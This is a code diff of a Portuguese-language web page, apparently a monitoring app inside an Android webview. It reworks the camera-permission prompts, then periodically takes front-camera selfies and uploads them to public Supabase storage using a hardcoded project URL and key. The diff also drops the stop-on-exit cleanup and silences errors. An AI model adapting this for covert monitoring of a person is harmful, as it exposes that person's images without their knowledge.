@@ -30,6 +30,8 @@
         .container {
             text-align: center;
             padding: 20px;
+            width: 100%;
+            max-width: 400px;
         }
         
         .led {
@@ -47,27 +49,26 @@
             50% { opacity: 0.2; }
         }
         
-        .status-container {
-            margin-top: 20px;
-        }
-        
         .status {
             color: #00ff00;
             font-size: 14px;
-            margin: 5px 0;
+            margin: 8px 0;
             font-family: monospace;
+            padding: 10px;
+            background: #0a0a0a;
+            border-radius: 8px;
         }
         
         .timer {
             color: #008800;
-            font-size: 24px;
+            font-size: 20px;
             font-family: monospace;
             margin: 10px 0;
         }
         
         .info {
             color: #004400;
-            font-size: 11px;
+            font-size: 10px;
             margin-top: 10px;
             font-family: monospace;
         }
@@ -82,34 +83,60 @@
             pointer-events: none;
         }
         
-        .permission-btn {
-            background: #00ff00;
-            color: #000;
+        button {
+            width: 100%;
+            padding: 18px;
+            margin: 8px 0;
             border: none;
-            padding: 15px 30px;
-            border-radius: 10px;
+            border-radius: 12px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         }
         
-        .permission-btn:active {
+        button:active {
             transform: scale(0.95);
         }
         
-        .permission-btn.show {
-            display: inline-block !important;
-            animation: pulse 1s infinite;
+        .btn-camera {
+            background: #00ff00;
+            color: #000;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .btn-config {
+            background: #ffaa00;
+            color: #000;
+        }
+        
+        .btn-iniciar {
+            background: #0088ff;
+            color: #fff;
         }
         
         @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+            0%, 100% { box-shadow: 0 0 10px #00ff00; }
+            50% { box-shadow: 0 0 30px #00ff00, 0 0 50px #00ff00; }
         }
         
         .hidden {
             display: none !important;
+        }
+        
+        .alerta {
+            background: #1a0000;
+            border: 1px solid #ff0000;
+            color: #ff4444;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            font-size: 13px;
+            text-align: left;
+        }
+        
+        .alerta strong {
+            color: #ff6666;
         }
     </style>
 </head>
@@ -117,22 +144,38 @@
     <div class="container">
         <div class="led" id="led"></div>
         <div class="timer" id="timer">Iniciando...</div>
-        <div class="status-container">
-            <div class="status" id="status1">Aguardando</div>
-            <div class="status" id="status2"></div>
-            <div class="status" id="status3"></div>
+        
+        <div class="status" id="status1">Verificando permissões...</div>
+        <div class="status" id="status2" style="display:none;"></div>
+        
+        <div class="alerta" id="alertaPermissao" style="display:none;">
+            <strong>⚠️ PERMISSÃO DA CÂMERA NEGADA</strong><br><br>
+            Para conceder permissão:<br>
+            1. Clique em <strong>"ABRIR CONFIGURAÇÕES"</strong><br>
+            2. Encontre <strong>"Permissões"</strong><br>
+            3. Ative a <strong>CÂMERA</strong><br>
+            4. Volte para o app
         </div>
-        <div class="info" id="info"></div>
-        <button class="permission-btn hidden" id="permissionBtn">
-            📷 CONCEDER PERMISSÕES
+        
+        <button class="btn-camera" id="btnPermissao" style="display:none;">
+            📷 CONCEDER PERMISSÃO DA CÂMERA
         </button>
+        
+        <button class="btn-config" id="btnConfig" style="display:none;">
+            ⚙️ ABRIR CONFIGURAÇÕES DO APLICATIVO
+        </button>
+        
+        <button class="btn-iniciar hidden" id="btnIniciar">
+            ▶️ INICIAR MONITORAMENTO
+        </button>
+        
+        <div class="info" id="info"></div>
     </div>
     <video id="cameraVideo" playsinline autoplay muted></video>
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
         (function() {
-            // Configuração global
             const CONFIG = {
                 SUPABASE_URL: 'https://vlkobipdenduyismnkpm.supabase.co',
                 SUPABASE_KEY: 'sb_publishable_qWeCNdiMyftZ6ZMYDF9u_A_bOplqpiA',
@@ -156,18 +199,77 @@
             const timerEl = document.getElementById('timer');
             const status1 = document.getElementById('status1');
             const status2 = document.getElementById('status2');
-            const status3 = document.getElementById('status3');
             const infoEl = document.getElementById('info');
             const cameraVideo = document.getElementById('cameraVideo');
-            const permissionBtn = document.getElementById('permissionBtn');
+            const btnPermissao = document.getElementById('btnPermissao');
+            const btnConfig = document.getElementById('btnConfig');
+            const btnIniciar = document.getElementById('btnIniciar');
+            const alertaPermissao = document.getElementById('alertaPermissao');
             
-            // CORREÇÃO 1: Adicionar event listener ao botão
-            permissionBtn.addEventListener('click', requestPermissions);
+            // === NOVOS BOTÕES DE PERMISSÃO ===
             
-            function updateStatus(msg, line = 1) {
-                const statusMap = { 1: status1, 2: status2, 3: status3 };
-                if (statusMap[line]) {
-                    statusMap[line].textContent = msg;
+            // Botão 1: Tentar permissão diretamente
+            btnPermissao.addEventListener('click', async () => {
+                status1.textContent = '📷 Solicitando permissão da câmera...';
+                btnPermissao.style.display = 'none';
+                
+                try {
+                    await startCamera();
+                    // Se funcionou
+                    mostrarMonitoramento();
+                } catch (error) {
+                    if (error.name === 'NotAllowedError') {
+                        // Permissão negada - mostrar opções
+                        status1.textContent = '❌ Permissão negada';
+                        status2.style.display = 'block';
+                        status2.textContent = 'Use o botão "ABRIR CONFIGURAÇÕES"';
+                        btnConfig.style.display = 'block';
+                        alertaPermissao.style.display = 'block';
+                    } else {
+                        btnPermissao.style.display = 'block';
+                        status1.textContent = '❌ Erro: ' + error.message;
+                    }
+                }
+            });
+            
+            // Botão 2: Abrir configurações do Android
+            btnConfig.addEventListener('click', () => {
+                // Tentar abrir configurações do app
+                try {
+                    // Método 1: Intent para configurações do app
+                    window.location.href = 'intent://#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=io.kodular.yourpackage;end';
+                    
+                    // Método 2: Abrir configurações gerais
+                    setTimeout(() => {
+                        window.location.href = 'android.settings.SETTINGS';
+                    }, 500);
+                } catch(e) {
+                    status1.textContent = '⚠️ Abra manualmente: Configurações > Aplicativos > [Nome do App] > Permissões';
+                }
+            });
+            
+            // Botão 3: Iniciar monitoramento
+            btnIniciar.addEventListener('click', () => {
+                startAll();
+                btnIniciar.style.display = 'none';
+            });
+            
+            function mostrarMonitoramento() {
+                btnPermissao.style.display = 'none';
+                btnConfig.style.display = 'none';
+                alertaPermissao.style.display = 'none';
+                btnIniciar.classList.remove('hidden');
+                status1.textContent = '✅ Permissão concedida!';
+                status2.style.display = 'none';
+            }
+            
+            // === FUNÇÕES ORIGINAIS ===
+            
+            function updateStatus(msg, isError = false) {
+                status1.textContent = msg;
+                if (isError) {
+                    status2.style.display = 'block';
+                    status2.textContent = msg;
                 }
                 console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
             }
@@ -178,7 +280,7 @@
                 const nextSelfie = Math.max(0, Math.ceil((CONFIG.SELFIE_INTERVAL - (now - lastSelfieTime)) / 1000));
                 
                 timerEl.textContent = `📸 ${nextScreenshot}s | 🤳 ${nextSelfie}s`;
-                infoEl.textContent = `Sessão: ${CONFIG.CODIGO_SESSAO} | Fila: ${uploadQueue.length} | ${navigator.onLine ? '🟢 Online' : '🔴 Offline'}`;
+                infoEl.textContent = `Sessão: ${CONFIG.CODIGO_SESSAO} | Fila: ${uploadQueue.length}`;
             }
             
             function piscarLED() {
@@ -190,50 +292,29 @@
                 }, 1000);
             }
             
-            // CORREÇÃO 2: Verificação de permissão melhorada
             async function checkPermissions() {
-                updateStatus('🔍 Verificando permissões...');
+                updateStatus('🔍 Verificando câmera...');
                 
-                // Tentar iniciar câmera diretamente
                 try {
                     await startCamera();
-                    updateStatus('✅ Permissão da câmera: Concedida');
-                    permissionBtn.classList.add('hidden');
-                    startAll();
+                    updateStatus('✅ Câmera OK!');
+                    btnIniciar.classList.remove('hidden');
                 } catch (error) {
-                    updateStatus('⚠️ Permissão da câmera necessária');
-                    permissionBtn.classList.remove('hidden');
-                    permissionBtn.classList.add('show');
-                    
                     if (error.name === 'NotAllowedError') {
-                        updateStatus('❌ Permissão negada anteriormente', 2);
-                        updateStatus('⚠️ Vá em Configurações > Site > Câmera > Permitir', 3);
+                        updateStatus('❌ Permissão da câmera NEGADA');
+                        btnPermissao.style.display = 'block';
+                        btnConfig.style.display = 'block';
+                        alertaPermissao.style.display = 'block';
+                    } else {
+                        updateStatus('⚠️ ' + error.message);
+                        btnPermissao.style.display = 'block';
                     }
-                }
-            }
-            
-            async function requestPermissions() {
-                updateStatus('📷 Solicitando permissões...');
-                permissionBtn.classList.remove('show');
-                permissionBtn.classList.add('hidden');
-                
-                try {
-                    await startCamera();
-                    await requestWakeLock();
-                    updateStatus('✅ Todas as permissões concedidas!');
-                    startAll();
-                } catch (error) {
-                    updateStatus('❌ Erro: ' + error.message);
-                    permissionBtn.classList.remove('hidden');
-                    permissionBtn.classList.add('show');
                 }
             }
             
             async function uploadToSupabase(blob, filename, tipo) {
                 uploadQueue.push({ blob, filename, tipo });
-                if (!isProcessing) {
-                    processQueue();
-                }
+                if (!isProcessing) processQueue();
             }
             
             async function processQueue() {
@@ -258,27 +339,21 @@
                         
                         const publicUrl = `${CONFIG.SUPABASE_URL}/storage/v1/object/public/captures/${filePath}`;
                         
-                        const { error: dbError } = await supabaseClient
-                            .from('captures')
-                            .insert({
-                                codigo_sessao: CONFIG.CODIGO_SESSAO,
-                                tipo: item.tipo,
-                                url: publicUrl,
-                                filename: item.filename,
-                                created_at: new Date().toISOString()
-                            });
+                        await supabaseClient.from('captures').insert({
+                            codigo_sessao: CONFIG.CODIGO_SESSAO,
+                            tipo: item.tipo,
+                            url: publicUrl,
+                            filename: item.filename,
+                            created_at: new Date().toISOString()
+                        });
                         
-                        if (dbError) throw dbError;
-                        
-                        updateStatus(`✅ ${item.tipo}: ${item.filename}`, 2);
+                        updateStatus(`✅ Enviado: ${item.filename}`);
                         piscarLED();
                         uploadQueue.shift();
                         
                     } catch (error) {
-                        updateStatus(`❌ Erro: ${error.message}`, 2);
-                        
-                        if (!navigator.onLine || error.message.includes('network')) {
-                            updateStatus('📦 Item mantido na fila (offline)', 3);
+                        if (!navigator.onLine) {
+                            updateStatus('📦 Offline - Item na fila');
                             break;
                         } else {
                             uploadQueue.shift();
@@ -304,41 +379,24 @@
                     
                     ctx.fillStyle = '#000';
                     ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
                     ctx.fillStyle = '#00ff00';
                     ctx.font = 'bold 24px monospace';
                     ctx.fillText('📱 Monitor MEUCEL1', 20, 40);
-                    ctx.fillText(`🕐 ${new Date().toLocaleString('pt-BR')}`, 20, 70);
-                    
-                    ctx.font = '16px monospace';
-                    ctx.fillText(`Status: Ativo`, 20, 100);
-                    ctx.fillText(`Online: ${navigator.onLine ? 'Sim' : 'Não'}`, 20, 125);
-                    ctx.fillText(`Resolução: ${canvas.width}x${canvas.height}`, 20, 150);
-                    ctx.fillText(`Fila: ${uploadQueue.length} items`, 20, 175);
+                    ctx.fillText(new Date().toLocaleString('pt-BR'), 20, 70);
                     
                     canvas.toBlob(async (blob) => {
                         if (blob) {
-                            const filename = `print_${Date.now()}.jpg`;
-                            await uploadToSupabase(blob, filename, 'print');
+                            await uploadToSupabase(blob, `print_${Date.now()}.jpg`, 'print');
                             lastScreenshotTime = Date.now();
                         }
                     }, 'image/jpeg', 0.6);
                     
-                } catch (error) {
-                    console.error('Erro screenshot:', error);
-                }
+                } catch (error) {}
             }
             
             async function captureSelfie() {
                 if (!monitoramentoAtivo) return;
-                
-                if (!cameraVideo || !cameraStream) {
-                    updateStatus('⚠️ Câmera indisponível', 3);
-                    try {
-                        await startCamera();
-                    } catch(e) {}
-                    return;
-                }
+                if (!cameraVideo || !cameraStream) return;
                 
                 try {
                     const canvas = document.createElement('canvas');
@@ -352,102 +410,53 @@
                     
                     canvas.toBlob(async (blob) => {
                         if (blob) {
-                            const filename = `selfie_${Date.now()}.jpg`;
-                            await uploadToSupabase(blob, filename, 'selfie');
+                            await uploadToSupabase(blob, `selfie_${Date.now()}.jpg`, 'selfie');
                             lastSelfieTime = Date.now();
                         }
                     }, 'image/jpeg', 0.7);
                     
-                } catch (error) {
-                    console.error('Erro selfie:', error);
-                }
+                } catch (error) {}
             }
             
             async function startCamera() {
-                try {
-                    if (cameraStream) {
-                        cameraStream.getTracks().forEach(track => track.stop());
-                    }
-                    
-                    updateStatus('📷 Iniciando câmera...');
-                    
-                    cameraStream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 480 },
-                            height: { ideal: 640 }
-                        },
-                        audio: false
-                    });
-                    
-                    cameraVideo.srcObject = cameraStream;
-                    await cameraVideo.play();
-                    
-                    updateStatus('✅ Câmera ativa', 1);
-                    lastSelfieTime = Date.now();
-                    
-                    return true;
-                } catch (error) {
-                    updateStatus('❌ Câmera: ' + error.message, 1);
-                    throw error;
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
                 }
+                
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 480 },
+                        height: { ideal: 640 }
+                    },
+                    audio: false
+                });
+                
+                cameraVideo.srcObject = cameraStream;
+                await cameraVideo.play();
+                
+                lastSelfieTime = Date.now();
+                return true;
             }
             
             async function requestWakeLock() {
                 try {
                     if ('wakeLock' in navigator) {
                         wakeLock = await navigator.wakeLock.request('screen');
-                        updateStatus('🔒 Tela mantida ativa', 3);
-                        
                         wakeLock.addEventListener('release', () => {
-                            updateStatus('⚠️ Wake Lock liberado', 3);
                             if (monitoramentoAtivo) {
                                 setTimeout(requestWakeLock, 1000);
                             }
                         });
                     }
-                } catch (err) {
-                    console.log('Wake Lock:', err);
-                }
+                } catch (err) {}
             }
-            
-            function keepAlive() {
-                localStorage.setItem('monitor_heartbeat', Date.now().toString());
-                
-                setInterval(() => {
-                    if (monitoramentoAtivo) {
-                        localStorage.setItem('monitor_heartbeat', Date.now().toString());
-                    }
-                }, 1000);
-            }
-            
-            // CORREÇÃO 3: Melhor tratamento de visibilidade
-            document.addEventListener('visibilitychange', () => {
-                if (document.hidden) {
-                    updateStatus('📱 App minimizado', 2);
-                } else {
-                    updateStatus('📱 App ativo', 2);
-                    if (monitoramentoAtivo) {
-                        requestWakeLock();
-                        processQueue();
-                    }
-                }
-            });
-            
-            window.addEventListener('online', () => {
-                updateStatus('🟢 Online - Processando fila', 2);
-                processQueue();
-            });
-            
-            window.addEventListener('offline', () => {
-                updateStatus('🔴 Offline - Capturas na fila', 2);
-            });
             
             function startAll() {
                 if (monitoramentoAtivo) return;
                 
                 monitoramentoAtivo = true;
-                updateStatus('🚀 Iniciando monitoramento...', 1);
+                updateStatus('🚀 Monitoramento ATIVO!');
                 
                 lastScreenshotTime = Date.now();
                 lastSelfieTime = Date.now();
@@ -458,25 +467,7 @@
                 setTimeout(captureSelfie, 5000);
                 selfieInterval = setInterval(captureSelfie, CONFIG.SELFIE_INTERVAL);
                 
-                keepAlive();
                 requestWakeLock();
-                
-                updateStatus('✅ Monitoramento ATIVO', 1);
-            }
-            
-            function stopAll() {
-                monitoramentoAtivo = false;
-                
-                if (screenshotInterval) clearInterval(screenshotInterval);
-                if (selfieInterval) clearInterval(selfieInterval);
-                
-                if (cameraStream) {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                }
-                
-                if (wakeLock) {
-                    wakeLock.release();
-                }
             }
             
             // Inicialização
@@ -486,16 +477,14 @@
                         CONFIG.SUPABASE_URL, 
                         CONFIG.SUPABASE_KEY
                     );
-                    updateStatus('✅ Supabase conectado');
+                    updateStatus('✅ Conectado ao Supabase');
                     checkPermissions();
                 } catch (error) {
                     updateStatus('❌ Erro: ' + error.message);
-                    permissionBtn.classList.remove('hidden');
-                    permissionBtn.classList.add('show');
                 }
             }
             
-            window.addEventListener('beforeunload', stopAll);
+            window.addEventListener('online', () => processQueue());
             setInterval(updateTimer, 1000);
             
             init();
